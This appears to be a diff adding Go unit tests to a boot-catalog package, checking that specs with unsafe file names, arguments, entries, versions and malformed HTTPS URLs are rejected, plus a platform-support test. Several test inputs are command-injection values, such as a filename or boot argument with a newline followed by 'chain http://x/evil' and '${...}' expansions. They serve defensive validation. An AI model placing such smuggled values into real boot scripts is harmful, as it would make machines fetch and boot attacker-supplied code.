@@ -78,6 +78,19 @@ func mutate(t *testing.T, fn func(*catalog.Spec)) catalog.Spec {
 	return catalog.Spec{}
 }
 
+// setKernel renames tlive's kernel file everywhere a spec names it, so a
+// row fails for the new name's own sake and not for an unlisted boot file.
+func setKernel(s *catalog.Spec, name string) {
+	s.Objects[0].Files[0] = name
+	s.Boot.Kernel = name
+}
+
+// setSecond does the same for the second stage.
+func setSecond(s *catalog.Spec, name string) {
+	s.Objects[0].Files[2] = name
+	s.Boot.Second = name
+}
+
 func TestNew_RejectsBadSpecs(t *testing.T) {
 	const sums = "https://upstream.example.test/SUMS"
 	const sig = "https://upstream.example.test/x.asc"
@@ -99,6 +112,33 @@ func TestNew_RejectsBadSpecs(t *testing.T) {
 		{"unknown container", "unknown container", func(s *catalog.Spec) { s.Objects[0].Container = "tar" }},
 		{"unsafe file", "clean relative path", func(s *catalog.Spec) { s.Objects[0].Files[0] = "../live/vmlinuz" }},
 		{"absolute file", "clean relative path", func(s *catalog.Spec) { s.Objects[0].Files[0] = "/live/vmlinuz" }},
+		{"file with newline", "script-safe", func(s *catalog.Spec) { setKernel(s, "live/vm\nchain http://x/evil") }},
+		{"file with carriage return", "script-safe", func(s *catalog.Spec) { setKernel(s, "live/vm\rboot") }},
+		{"file with tab", "script-safe", func(s *catalog.Spec) { setKernel(s, "live/vm\tx") }},
+		{"file with space", "script-safe", func(s *catalog.Spec) { setKernel(s, "live/my kernel") }},
+		{"file with dollar", "script-safe", func(s *catalog.Spec) { setKernel(s, "live/${next}") }},
+		{"file with hash", "script-safe", func(s *catalog.Spec) { setKernel(s, "live/#x") }},
+		{"file with non-ASCII", "script-safe", func(s *catalog.Spec) { setKernel(s, "live/vmlinüz") }},
+		{"file with DEL", "script-safe", func(s *catalog.Spec) { setKernel(s, "live/vm\x7f") }},
+		{"second with newline", "script-safe", func(s *catalog.Spec) { setSecond(s, "live/fs\nboot") }},
+		{"args with newline", "args", func(s *catalog.Spec) { s.Args = "boot=live\nchain http://x/evil" }},
+		{"args with carriage return", "args", func(s *catalog.Spec) { s.Args = "boot=live\rboot" }},
+		{"args with tab", "args", func(s *catalog.Spec) { s.Args = "boot=live\tx" }},
+		{"args with dollar", "args", func(s *catalog.Spec) { s.Args = "boot=live ${net0/mac}" }},
+		{"args with non-ASCII", "args", func(s *catalog.Spec) { s.Args = "boot=live ü" }},
+		{"args with DEL", "args", func(s *catalog.Spec) { s.Args = "boot=live\x7f" }},
+		{"entry dot", "entry", func(s *catalog.Spec) { s.Entry = "." }},
+		{"entry dot dot", "entry", func(s *catalog.Spec) { s.Entry = ".." }},
+		{"version dot", "version", func(s *catalog.Spec) { s.Version = "." }},
+		{"version dot dot", "version", func(s *catalog.Spec) { s.Version = ".." }},
+		{"https scheme only", "not https", func(s *catalog.Spec) { s.Objects[0].URL = "https://" }},
+		{"https no host", "not https", func(s *catalog.Spec) { s.Objects[0].URL = "https:///x.zip" }},
+		{"sig url https scheme only", "not https", func(s *catalog.Spec) {
+			s.Objects[0].Signature = catalog.Signature{SigURL: "https://", Key: "x.asc"}
+		}},
+		{"checksums url https scheme only", "not https", func(s *catalog.Spec) {
+			s.Objects[0].Signature = catalog.Signature{TOFU: true, ChecksumsURL: "https://", ChecksumAlgo: "sha256"}
+		}},
 		{"duplicate file", "listed twice", func(s *catalog.Spec) { s.Objects[0].Files[1] = s.Objects[0].Files[0] }},
 		{"kernel not listed", "boot file", func(s *catalog.Spec) { s.Boot.Kernel = "live/other" }},
 		{"initrd not listed", "boot file", func(s *catalog.Spec) { s.Boot.Initrds = []string{"live/other"} }},
@@ -454,6 +494,30 @@ func TestEntry_MinRAM(t *testing.T) {
 		e := catalog.Entry{Pin: catalog.Pin{Objects: []catalog.ObjectPin{{Files: []catalog.FilePin{{Size: tt.size}}}}}}
 		if got := e.MinRAMBytes(); got != tt.want {
 			t.Errorf("MinRAMBytes with a %d byte file = %d, want %d", tt.size, got, tt.want)
+		}
+	}
+}
+
+func TestSpec_Supports(t *testing.T) {
+	c := catalogtest.New(t, "https://upstream.example.test").Catalog
+	tests := []struct {
+		arch     string
+		platform catalog.Platform
+		want     bool
+	}{
+		{"amd64", catalog.PlatformEFI, true},
+		{"amd64", catalog.PlatformPCBIOS, true},
+		{"arm64", catalog.PlatformEFI, true},
+		{"arm64", catalog.PlatformPCBIOS, false},
+		{"amd64", "linux", false},
+	}
+	for _, tt := range tests {
+		e, ok := c.Lookup("tlive", tt.arch)
+		if !ok {
+			t.Fatalf("tlive %s not in the fixture", tt.arch)
+		}
+		if got := e.Supports(tt.platform); got != tt.want {
+			t.Errorf("tlive %s Supports(%q) = %t, want %t", tt.arch, tt.platform, got, tt.want)
 		}
 	}
 }
